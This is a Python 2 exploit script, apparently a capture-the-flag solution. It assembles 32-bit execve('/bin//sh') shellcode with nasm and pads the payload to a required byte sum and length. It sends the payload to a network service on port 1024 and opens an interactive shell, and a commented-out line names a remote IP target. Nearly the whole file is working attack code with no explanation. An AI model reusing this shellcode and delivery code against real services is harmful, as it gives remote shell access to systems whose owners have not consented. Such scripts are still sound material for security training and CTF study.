#!/usr/bin/env python2

import hashlib
import socket
import string
import struct
import subprocess
import telnetlib


def read_until(f, delim='\n'):
    data = ""
    while not data.endswith(delim):
        data += f.read(1)
    return data

def connect(rhp=("localhost", 1024)):
    s = socket.create_connection(rhp)
    f = s.makefile('rw', bufsize=0)
    return s, f

def interact(s):
    t = telnetlib.Telnet()
    t.sock = s

    print "[+] 4ll y0U n33D 15 5h3ll!!"
    t.interact()

def p(x, t="<I"):
    return struct.pack(t, x)

def u(x, t="<I"):
    return struct.unpack(t, x)[0]

def unsigned(x):
    return u(p(x, t="<i"), t="<I")

def gen_shellcode(source, bits=32):
    source = "".join([
        "BITS %d\n"%(bits),
        source,
        ])
    filename = hashlib.md5(source).hexdigest()
    with open("/tmp/%s.s"%(filename), "wb") as f:
        f.write(source)
    subprocess.call("nasm /tmp/%s.s -o /tmp/%s"%(filename, filename), shell=True)
    with open("/tmp/%s"%filename, "rb") as f:
        shellcode = f.read()
    return filename, shellcode

def message(message_type, message_body, value=None):
    text = ""
    if value:
        text = "[{}] {}: 0x{:08x}".format(message_type, message_body, value)
    else:
        text = "[{}] {}".format(message_type, message_body)
    print text

calc = lambda bytes: sum(map(ord, bytes))

filename, shellcode = gen_shellcode("""
        ; will be placed a skipped byte.
        xor     ecx, ecx
        mul     ecx
        push    ecx
        push    "//sh"
        push    "/bin"
        mov     ebx, esp
        add     al, 0xb
        int     0x80
        """)
message('+', "shellcode(%s: %dbytes): %s"%(filename, len(shellcode), repr(shellcode)))

_, reserved = gen_shellcode("xchg   edi, eax")
footer = "\x47\xff\xe7"

diff = 0x1ee7 - calc(shellcode + reserved + footer)
dist = 0x3d - len(shellcode + reserved) - 1
pad = diff // dist

assert pad < 0x100
message('-', "the pad byte: %s"%repr(chr(pad)))

payload = ''.join((
    chr(0x1ee7 - calc(''.join((
        shellcode, chr(pad)*dist, reserved, footer,
        )))),
    shellcode,
    chr(pad) * dist,
    reserved,
    #footer,
    ))

message('+', "payload(%dbytes): %s"%(len(payload), repr(payload)))
message('+', "the sum of payload", calc(payload+footer))

assert calc(payload+footer) == 0x1ee7
assert len(payload) == 0x3d

#rhp = ("188.40.147.100", 1024)
s, f = connect()
read_until(f)

f.write(payload)
interact(s)
